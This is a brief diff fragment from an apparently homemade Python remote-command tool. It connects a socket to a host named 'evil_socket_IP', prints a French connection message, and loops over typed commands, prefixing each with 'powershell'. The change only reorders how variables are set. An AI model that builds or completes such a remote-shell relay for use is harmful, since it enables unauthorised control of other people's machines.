@@ -13,8 +13,8 @@ client_socket.connect((evil_socket_IP,evil_socket_port))
 print("connexion réussi")
 
 while True:
+    message = ""
     message = ["powershell"]
-    command = input(">>> ")
     try :
         command = input(">>> ")
         message += command
